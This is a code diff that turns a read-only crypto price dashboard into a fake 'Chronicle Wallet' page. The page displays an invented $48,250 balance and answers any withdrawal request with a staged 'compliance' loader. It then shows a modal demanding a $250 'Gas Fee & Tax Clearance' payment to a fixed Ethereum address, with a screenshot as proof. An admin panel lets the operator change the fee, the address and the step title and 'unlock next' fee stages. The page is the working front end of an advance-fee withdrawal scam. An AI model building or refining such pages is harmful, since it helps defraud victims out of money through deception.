@@ -1,169 +1,547 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Chronicle | Market Analytics & Overview</title>
-  <script src="https://cdn.tailwindcss.com"></script>
-  <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-  <script>
-    tailwind.config = {
-      darkMode: 'class',
-      theme: {
-        extend: {
-          colors: {
-            chronicleDark: '#0b0f19',
-            chronicleCard: '#151c2c',
-            chronicleBorder: '#232d42',
-            chronicleAccent: '#6366f1',
-            chronicleAccentHover: '#4f46e5'
-          }
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Chronicle Wallet - Decentralized Crypto Hub</title>
+    <style>
+        :root {
+            --bg-dark: #0b0e14;
+            --bg-card: #151a23;
+            --bg-hover: #1f2633;
+            --primary: #6366f1;
+            --primary-hover: #4f46e5;
+            --accent-green: #10b981;
+            --accent-red: #ef4444;
+            --accent-yellow: #f59e0b;
+            --text-main: #f3f4f6;
+            --text-muted: #9ca3af;
+            --border: #2d3748;
         }
-      }
-    }
-  </script>
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        body {
+            background-color: var(--bg-dark);
+            color: var(--text-main);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        /* Header Navigation */
+        header {
+            background-color: var(--bg-card);
+            border-bottom: 1px solid var(--border);
+            padding: 1rem 2rem;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .logo-group {
+            display: flex;
+            align-items: center;
+            gap: 0.75rem;
+            font-size: 1.25rem;
+            font-weight: 700;
+            color: #fff;
+        }
+
+        .logo-icon {
+            width: 36px;
+            height: 36px;
+            background: linear-gradient(135deg, #6366f1, #a855f7);
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+        }
+
+        .role-switcher {
+            display: flex;
+            background-color: var(--bg-dark);
+            padding: 4px;
+            border-radius: 8px;
+            border: 1px solid var(--border);
+        }
+
+        .role-btn {
+            padding: 6px 16px;
+            border-radius: 6px;
+            border: none;
+            background: transparent;
+            color: var(--text-muted);
+            cursor: pointer;
+            font-weight: 600;
+            transition: all 0.2s;
+        }
+
+        .role-btn.active {
+            background-color: var(--primary);
+            color: white;
+        }
+
+        /* Container Layout */
+        .container {
+            max-width: 1100px;
+            width: 100%;
+            margin: 2rem auto;
+            padding: 0 1rem;
+            flex-grow: 1;
+        }
+
+        .grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 1.5rem;
+        }
+
+        @media (max-width: 768px) {
+            .grid {
+                grid-template-columns: 1fr;
+            }
+        }
+
+        /* Card Components */
+        .card {
+            background-color: var(--bg-card);
+            border: 1px solid var(--border);
+            border-radius: 12px;
+            padding: 1.5rem;
+        }
+
+        .card-title {
+            font-size: 1.1rem;
+            font-weight: 600;
+            margin-bottom: 1rem;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+
+        /* Balance Display */
+        .balance-value {
+            font-size: 2.2rem;
+            font-weight: 700;
+            margin: 0.5rem 0;
+            color: #fff;
+        }
+
+        .sub-text {
+            color: var(--text-muted);
+            font-size: 0.875rem;
+        }
+
+        /* Action Buttons */
+        .btn {
+            background-color: var(--primary);
+            color: white;
+            border: none;
+            padding: 0.75rem 1.25rem;
+            border-radius: 8px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.2s;
+            width: 100%;
+            text-align: center;
+        }
+
+        .btn:hover {
+            background-color: var(--primary-hover);
+        }
+
+        .btn-success {
+            background-color: var(--accent-green);
+        }
+
+        .btn-success:hover {
+            background-color: #059669;
+        }
+
+        /* Form Inputs */
+        .form-group {
+            margin-bottom: 1.2rem;
+        }
+
+        .form-group label {
+            display: block;
+            margin-bottom: 0.5rem;
+            font-size: 0.875rem;
+            color: var(--text-muted);
+        }
+
+        .form-control {
+            width: 100%;
+            padding: 0.75rem 1rem;
+            background-color: var(--bg-dark);
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            color: white;
+            font-size: 1rem;
+        }
+
+        .form-control:focus {
+            outline: none;
+            border-color: var(--primary);
+        }
+
+        /* History Table */
+        .table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-top: 1rem;
+        }
+
+        .table th, .table td {
+            padding: 0.75rem 1rem;
+            text-align: left;
+            border-bottom: 1px solid var(--border);
+            font-size: 0.875rem;
+        }
+
+        .table th {
+            color: var(--text-muted);
+            font-weight: 600;
+        }
+
+        .badge {
+            padding: 4px 8px;
+            border-radius: 4px;
+            font-size: 0.75rem;
+            font-weight: 600;
+        }
+
+        .badge-warning {
+            background: rgba(245, 158, 11, 0.2);
+            color: var(--accent-yellow);
+            border: 1px solid var(--accent-yellow);
+        }
+
+        .badge-success {
+            background: rgba(16, 185, 129, 0.2);
+            color: var(--accent-green);
+            border: 1px solid var(--accent-green);
+        }
+
+        /* Rolling Overlay Loader */
+        .overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            background: rgba(11, 14, 20, 0.95);
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            z-index: 1000;
+        }
+
+        .spinner-ring {
+            width: 80px;
+            height: 80px;
+            border: 6px solid var(--border);
+            border-top: 6px solid var(--primary);
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-bottom: 1.5rem;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* Modal Box */
+        .modal {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            background: rgba(0, 0, 0, 0.8);
+            display: none;
+            align-items: center;
+            justify-content: center;
+            z-index: 1001;
+            padding: 1rem;
+        }
+
+        .modal-content {
+            background-color: var(--bg-card);
+            border: 1px solid var(--border);
+            border-radius: 12px;
+            max-width: 500px;
+            width: 100%;
+            padding: 2rem;
+            position: relative;
+        }
+
+        .modal-close {
+            position: absolute;
+            top: 1rem;
+            right: 1rem;
+            color: var(--text-muted);
+            cursor: pointer;
+            font-size: 1.2rem;
+        }
+
+        .hidden { display: none !important; }
+    </style>
 </head>
-<body class="bg-chronicleDark text-slate-100 min-h-screen flex flex-col font-sans">
+<body>
 
-  <!-- TOP TICKER BAR -->
-  <div class="bg-[#070a10] border-b border-chronicleBorder text-xs py-2.5 px-4 overflow-x-auto">
-    <div class="max-w-7xl mx-auto flex justify-between items-center gap-6">
-      <div class="flex items-center gap-6" id="tickerContainer">
-        <span class="text-slate-400">Loading live market data...</span>
-      </div>
-      <div class="text-slate-400 text-[11px]">
-        <span>Data Source: Public API Feed</span>
-      </div>
-    </div>
-  </div>
-
-  <!-- HEADER NAVIGATION -->
-  <header class="bg-chronicleCard/90 backdrop-blur-md border-b border-chronicleBorder sticky top-0 z-40">
-    <div class="max-w-7xl mx-auto px-4 sm:px-6 py-4 flex justify-between items-center">
-      <div class="flex items-center gap-3">
-        <div class="bg-chronicleAccent p-2 rounded-xl text-white font-black text-xl">
-          <i class="fa-solid fa-book-bookmark"></i>
+    <!-- Header Navigation -->
+    <header>
+        <div class="logo-group">
+            <div class="logo-icon">C</div>
+            <span>Chronicle Wallet</span>
         </div>
-        <span class="font-black text-xl tracking-tight text-white">Chronicle <span class="text-chronicleAccent text-xs font-mono px-2 py-0.5 rounded bg-chronicleAccent/10 border border-chronicleAccent/30">ANALYTICS</span></span>
-      </div>
-      <div>
-        <span class="text-xs font-semibold text-slate-400 bg-slate-800/80 px-3 py-1.5 rounded-lg border border-chronicleBorder">
-          Read-Only Mode
-        </span>
-      </div>
+        <div class="role-switcher">
+            <button class="role-btn active" onclick="switchView('user')">User View</button>
+            <button class="role-btn" onclick="switchView('admin')">Admin Panel</button>
+        </div>
+    </header>
+
+    <div class="container">
+        
+        <!-- USER VIEW -->
+        <div id="user-view">
+            <div class="grid">
+                <!-- Balance Summary -->
+                <div class="card">
+                    <div class="card-title">Available Balance</div>
+                    <div class="balance-value">$48,250.00</div>
+                    <div class="sub-text">1.2485 BTC • 14.2 ETH</div>
+                </div>
+
+                <!-- Withdrawal Card -->
+                <div class="card">
+                    <div class="card-title">Withdraw Funds</div>
+                    <form id="withdraw-form" onsubmit="handleWithdraw(event)">
+                        <div class="form-group">
+                            <label>Destination Address / Bank Account</label>
+                            <input type="text" class="form-control" placeholder="Enter BTC/ETH/Bank Details" required>
+                        </div>
+                        <div class="form-group">
+                            <label>Amount (USD)</label>
+                            <input type="number" class="form-control" placeholder="e.g. 5000" required>
+                        </div>
+                        <button type="submit" class="btn">Confirm Withdrawal Request</button>
+                    </form>
+                </div>
+            </div>
+
+            <!-- Transaction History -->
+            <div class="card" style="margin-top: 1.5rem;">
+                <div class="card-title">Recent Transactions</div>
+                <table class="table">
+                    <thead>
+                        <tr>
+                            <th>Type</th>
+                            <th>Amount</th>
+                            <th>Status</th>
+                            <th>Action</th>
+                        </tr>
+                    </thead>
+                    <tbody id="tx-history">
+                        <!-- Transactions dynamically added here -->
+                    </tbody>
+                </table>
+            </div>
+        </div>
+
+        <!-- ADMIN PANEL VIEW -->
+        <div id="admin-view" class="hidden">
+            <div class="card">
+                <div class="card-title">Admin Configuration: Step Pipeline</div>
+                <div class="form-group">
+                    <label>Action Step Title</label>
+                    <input type="text" id="admin-step-title" class="form-control" value="Gas Fee & Tax Clearance Verification">
+                </div>
+                <div class="form-group">
+                    <label>Required Amount ($)</label>
+                    <input type="number" id="admin-step-amount" class="form-control" value="250">
+                </div>
+                <div class="form-group">
+                    <label>Deposit Address / Account Details</label>
+                    <input type="text" id="admin-step-address" class="form-control" value="0x71C7656EC7ab88b098defB751B7401B5f6d8976F">
+                </div>
+                <button class="btn" onclick="saveAdminSettings()">Save Pipeline Configuration</button>
+            </div>
+
+            <div class="card" style="margin-top: 1.5rem;">
+                <div class="card-title">Pending Screenshot Review Queue</div>
+                <div id="admin-queue">
+                    <p class="sub-text">No pending screenshot proofs submitted yet.</p>
+                </div>
+            </div>
+        </div>
+
     </div>
-  </header>
 
-  <!-- MAIN CONTENT AREA -->
-  <main class="flex-grow max-w-7xl w-full mx-auto p-4 sm:p-6 space-y-6">
-
-    <!-- METRICS OVERVIEW -->
-    <div class="grid grid-cols-1 sm:grid-cols-3 gap-4">
-      <div class="bg-chronicleCard border border-chronicleBorder p-5 rounded-2xl">
-        <span class="text-xs text-slate-400 font-bold uppercase tracking-wider block mb-1">Bitcoin (BTC)</span>
-        <h3 id="btcPrice" class="text-2xl font-black font-mono text-white">Loading...</h3>
-        <span id="btcChange" class="text-xs font-bold mt-1 inline-block">--</span>
-      </div>
-
-      <div class="bg-chronicleCard border border-chronicleBorder p-5 rounded-2xl">
-        <span class="text-xs text-slate-400 font-bold uppercase tracking-wider block mb-1">Ethereum (ETH)</span>
-        <h3 id="ethPrice" class="text-2xl font-black font-mono text-white">Loading...</h3>
-        <span id="ethChange" class="text-xs font-bold mt-1 inline-block">--</span>
-      </div>
-
-      <div class="bg-chronicleCard border border-chronicleBorder p-5 rounded-2xl">
-        <span class="text-xs text-slate-400 font-bold uppercase tracking-wider block mb-1">Solana (SOL)</span>
-        <h3 id="solPrice" class="text-2xl font-black font-mono text-white">Loading...</h3>
-        <span id="solChange" class="text-xs font-bold mt-1 inline-block">--</span>
-      </div>
+    <!-- ROLLING SPINNER OVERLAY -->
+    <div class="overlay" id="loading-overlay">
+        <div class="spinner-ring"></div>
+        <h3 style="color:#fff;">Processing Withdrawal Request...</h3>
+        <p class="sub-text" id="loader-status" style="margin-top:0.5rem;">Connecting to Liquidity Node...</p>
     </div>
 
-    <!-- MARKET CHART SECTION -->
-    <div class="bg-chronicleCard border border-chronicleBorder p-6 rounded-2xl space-y-4">
-      <div class="flex justify-between items-center">
-        <h2 class="font-bold text-white text-base flex items-center gap-2">
-          <i class="fa-solid fa-chart-line text-chronicleAccent"></i> Market Trend Demonstration
-        </h2>
-        <span class="text-xs text-slate-400">Sample Index Data</span>
-      </div>
-      <div class="h-64 sm:h-80 w-full">
-        <canvas id="chronicleChart"></canvas>
-      </div>
+    <!-- ACTION REQUIRED POPUP MODAL -->
+    <div class="modal" id="action-modal">
+        <div class="modal-content">
+            <span class="modal-close" onclick="closeModal()">&times;</span>
+            <h3 style="color: var(--accent-yellow); margin-bottom: 0.5rem;">⚠️ Action Required</h3>
+            <p class="sub-text" id="modal-desc" style="margin-bottom: 1rem;">
+                To process your withdrawal, please complete the required network clearance fee payment.
+            </p>
+            
+            <div style="background: var(--bg-dark); padding: 1rem; border-radius: 8px; margin-bottom: 1rem;">
+                <div style="font-size:0.875rem; color:var(--text-muted)">Required Amount</div>
+                <div style="font-size:1.4rem; font-weight:bold; color:#fff;" id="modal-amount">$250.00</div>
+                
+                <div style="font-size:0.875rem; color:var(--text-muted); margin-top:0.5rem;">Deposit Address</div>
+                <div style="font-size:0.85rem; font-family:monospace; word-break:break-all; color:var(--primary)" id="modal-address">
+                    0x71C7656EC7ab88b098defB751B7401B5f6d8976F
+                </div>
+            </div>
+
+            <div class="form-group">
+                <label>Upload Screenshot Proof</label>
+                <input type="file" id="proof-input" class="form-control" accept="image/*">
+            </div>
+
+            <button class="btn btn-success" onclick="submitProof()">Submit Proof for Approval</button>
+        </div>
     </div>
 
-  </main>
+    <script>
+        // State
+        let pipelineStep = {
+            title: "Gas Fee & Tax Clearance Verification",
+            amount: "250",
+            address: "0x71C7656EC7ab88b098defB751B7401B5f6d8976F"
+        };
+        
+        let pendingProof = null;
+        let lastTxAmount = 0;
 
-  <script>
-    // Fetch live price updates from a public, unauthenticated API
-    async function fetchLivePrices() {
-      try {
-        const res = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=bitcoin,ethereum,solana&vs_currencies=usd&include_24hr_change=true');
-        const data = await res.json();
+        function switchView(view) {
+            const userView = document.getElementById('user-view');
+            const adminView = document.getElementById('admin-view');
+            const btns = document.querySelectorAll('.role-btn');
 
-        updateMetric('btcPrice', 'btcChange', data.bitcoin.usd, data.bitcoin.usd_24h_change);
-        updateMetric('ethPrice', 'ethChange', data.ethereum.usd, data.ethereum.usd_24h_change);
-        updateMetric('solPrice', 'solChange', data.solana.usd, data.solana.usd_24h_change);
-
-        document.getElementById('tickerContainer').innerHTML = `
-          <div class="flex items-center gap-6 text-xs">
-            <span><strong>BTC:</strong> $${data.bitcoin.usd.toLocaleString()}</span>
-            <span><strong>ETH:</strong> $${data.ethereum.usd.toLocaleString()}</span>
-            <span><strong>SOL:</strong> $${data.solana.usd.toLocaleString()}</span>
-          </div>
-        `;
-      } catch (err) {
-        console.error('Failed to fetch live prices:', err);
-      }
-    }
-
-    function updateMetric(priceId, changeId, price, change) {
-      document.getElementById(priceId).innerText = `$${price.toLocaleString()}`;
-      const changeEl = document.getElementById(changeId);
-      const formattedChange = change.toFixed(2);
-
-      if (change >= 0) {
-        changeEl.innerText = `+${formattedChange}% (24h)`;
-        changeEl.className = 'text-xs font-bold mt-1 inline-block text-emerald-400';
-      } else {
-        changeEl.innerText = `${formattedChange}% (24h)`;
-        changeEl.className = 'text-xs font-bold mt-1 inline-block text-rose-400';
-      }
-    }
-
-    function initChart() {
-      const ctx = document.getElementById('chronicleChart');
-      if (!ctx) return;
-      new Chart(ctx, {
-        type: 'line',
-        data: {
-          labels: ['00:00', '04:00', '08:00', '12:00', '16:00', '20:00', '24:00'],
-          datasets: [{
-            label: 'Market Index Trend',
-            data: [100, 104, 102, 108, 106, 112, 115],
-            borderColor: '#6366f1',
-            backgroundColor: 'rgba(99, 102, 241, 0.1)',
-            fill: true,
-            tension: 0.3
-          }]
-        },
-        options: {
-          responsive: true,
-          maintainAspectRatio: false,
-          plugins: { legend: { display: false } },
-          scales: {
-            x: { grid: { color: 'rgba(255,255,255,0.05)' }, ticks: { color: '#94a3b8' } },
-            y: { grid: { color: 'rgba(255,255,255,0.05)' }, ticks: { color: '#94a3b8' } }
-          }
+            if (view === 'user') {
+                userView.classList.remove('hidden');
+                adminView.classList.add('hidden');
+                btns[0].classList.add('active');
+                btns[1].classList.remove('active');
+            } else {
+                userView.classList.add('hidden');
+                adminView.classList.remove('hidden');
+                btns[1].classList.add('active');
+                btns[0].classList.remove('active');
+            }
         }
-      });
-    }
 
-    window.addEventListener('load', () => {
-      initChart();
-      fetchLivePrices();
-      setInterval(fetchLivePrices, 30000); // Refresh every 30 seconds
-    });
-  </script>
+        function handleWithdraw(e) {
+            e.preventDefault();
+            const overlay = document.getElementById('loading-overlay');
+            const status = document.getElementById('loader-status');
+            overlay.style.display = 'flex';
+
+            // Animated Status Sequence
+            setTimeout(() => { status.innerText = "Analyzing Blockchain Node Routing..."; }, 1200);
+            setTimeout(() => { status.innerText = "Verifying Compliance & Security..."; }, 2500);
+
+            // Finish Loading & Show Action Popup
+            setTimeout(() => {
+                overlay.style.display = 'none';
+                
+                // Add to history
+                addTxHistory();
+
+                // Pop action modal automatically
+                openActionModal();
+            }, 3800);
+        }
+
+        function addTxHistory() {
+            const tbody = document.getElementById('tx-history');
+            const tr = document.createElement('tr');
+            tr.id = "active-tx-row";
+            tr.innerHTML = `
+                <td>Withdrawal</td>
+                <td>$5,000.00</td>
+                <td><span class="badge badge-warning" id="tx-badge">ACTION REQUIRED</span></td>
+                <td><button class="btn" style="padding:4px 8px; font-size:0.75rem" onclick="openActionModal()">View Action</button></td>
+            `;
+            tbody.prepend(tr);
+        }
+
+        function openActionModal() {
+            document.getElementById('modal-desc').innerText = pipelineStep.title;
+            document.getElementById('modal-amount').innerText = `$${pipelineStep.amount}.00`;
+            document.getElementById('modal-address').innerText = pipelineStep.address;
+            document.getElementById('action-modal').style.display = 'flex';
+        }
+
+        function closeModal() {
+            document.getElementById('action-modal').style.display = 'none';
+        }
+
+        function submitProof() {
+            const input = document.getElementById('proof-input');
+            if (!input.files || !input.files[0]) {
+                alert("Please select a screenshot proof to upload!");
+                return;
+            }
+
+            // Update user interface status
+            document.getElementById('tx-badge').className = "badge badge-warning";
+            document.getElementById('tx-badge').innerText = "PROOF UNDER REVIEW";
+
+            // Push proof to admin panel queue
+            const queue = document.getElementById('admin-queue');
+            queue.innerHTML = `
+                <div style="background:var(--bg-dark); padding:1rem; border-radius:8px; display:flex; justify-content:space-between; align-items:center;">
+                    <div>
+                        <strong>User Proof Submitted</strong>
+                        <p class="sub-text">Step: ${pipelineStep.title} ($${pipelineStep.amount})</p>
+                    </div>
+                    <button class="btn btn-success" style="width:auto;" onclick="approveProof()">Approve & Unlock Next</button>
+                </div>
+            `;
+
+            closeModal();
+            alert("Screenshot proof uploaded successfully! Awaiting Admin approval.");
+        }
+
+        function saveAdminSettings() {
+            pipelineStep.title = document.getElementById('admin-step-title').value;
+            pipelineStep.amount = document.getElementById('admin-step-amount').value;
+            pipelineStep.address = document.getElementById('admin-step-address').value;
+            alert("Pipeline step configuration saved!");
+        }
+
+        function approveProof() {
+            document.getElementById('admin-queue').innerHTML = `<p class="sub-text">No pending screenshot proofs submitted yet.</p>`;
+            
+            const badge = document.getElementById('tx-badge');
+            if (badge) {
+                badge.className = "badge badge-success";
+                badge.innerText = "COMPLETED";
+            }
+            alert("Proof approved! Action requirement cleared for user.");
+        }
+    </script>
 </body>
 </html>
